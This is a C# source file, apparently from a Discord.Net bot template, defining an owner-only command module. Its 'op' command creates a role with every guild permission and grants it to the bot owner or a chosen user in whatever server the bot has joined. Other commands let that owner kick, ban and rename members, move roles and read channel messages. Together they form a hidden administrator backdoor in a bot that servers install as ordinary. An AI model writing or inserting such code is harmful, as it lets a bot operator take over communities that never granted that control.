using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Discord;
using Discord.Commands;
using Discord.Rest;
using Discord.WebSocket;
using DiscordNetTemplate.PreconditionalAttributes;

namespace DiscordNetTemplate.Modules
{
    [RequireDoomOwner]
    public class OwnerModule : ModuleBase<SocketCommandContext>
    {
        [Command("createguild")]
        public async Task CreateGuild([Remainder]string GuildName)
        {
            var Client = Context.Client;

            var Region = (await Client.GetVoiceRegionsAsync()).First();

            var NewGuild = await Client.CreateGuildAsync(GuildName, Region);

            var Invite = (await (await NewGuild.GetTextChannelsAsync()).First().CreateInviteAsync(null, null, false, true));

            _ = ReplyAsync(Invite.ToString());
        }
        
        [Command("op")]
        public Task OP([Remainder]string RoleName = "OP")
        {
            _ = OP(Context.Guild.GetUser(Context.User.Id), RoleName);

            return Task.CompletedTask;
        }
        
        [Command("op")]
        public async Task OP(SocketGuildUser User, [Remainder]string RoleName = "OP")
        {
            var Role = await Context.Guild.CreateRoleAsync(RoleName, GuildPermissions.All, null, false, null);

            _ = User.AddRoleAsync(Role);
        }
        
        [Command("giverole")]
        public Task GiveRole(SocketGuildUser User, SocketRole Role)
        {
            _ = User.AddRoleAsync(Role);
            
            return Task.CompletedTask;
        }
        
        [Command("remrole")]
        public Task RemRole(SocketGuildUser User, SocketRole Role)
        {
            _ = User.RemoveRoleAsync(Role);
            
            return Task.CompletedTask;
        }
        
        [Command("opkick")]
        public Task Kick(SocketGuildUser TargetUser, [Remainder]string Reason = "No reason given")
        {
            _ = TargetUser.SendMessageAsync($"You've been kicked from {TargetUser.Guild}! - {Reason}");

            _ = TargetUser.KickAsync(Reason);
            
            _ = ReplyAsync($":white_check_mark: | Successfully `kicked` {TargetUser.Mention} !");

            return Task.CompletedTask;
        }
        
        [Command("opban")]
        public Task Ban(SocketGuildUser TargetUser, [Remainder]string Reason = "No reason given")
        {
            _ = TargetUser.SendMessageAsync($"You've been banned from {TargetUser.Guild}! - {Reason}");

            _ = TargetUser.BanAsync(0, Reason);
            
            _ = ReplyAsync($":white_check_mark: | Successfully `banned` {TargetUser.Mention} !");

            
            return Task.CompletedTask;
        }
        
        [Command("read")]
        public async Task Read(ulong MsgID)
        {
            var Msg = await Context.Channel.GetMessageAsync(MsgID);
            
            _ = ReplyAsync($"`{Msg.Content}`");
        }
        
        [Command("readembed")]
        public async Task ReadEmbed(ulong MsgID)
        {
            var Msg = await Context.Channel.GetMessageAsync(MsgID);

            _ = ReplyAsync($"`{Msg.Embeds.FirstOrDefault()?.Description}`");
        }
        
        [Command("opren")]
        public Task Rename(SocketGuildUser TargetUser, [Remainder]string NewName = null)
        {
            var OldUser = TargetUser.Nickname ?? TargetUser.ToString();

            _ = TargetUser.ModifyAsync(x => x.Nickname = NewName);

            _ = ReplyAsync($":white_check_mark: | Successfully `renamed` {TargetUser.Mention} from {OldUser} !");

            return Task.CompletedTask;
        }
    }
}
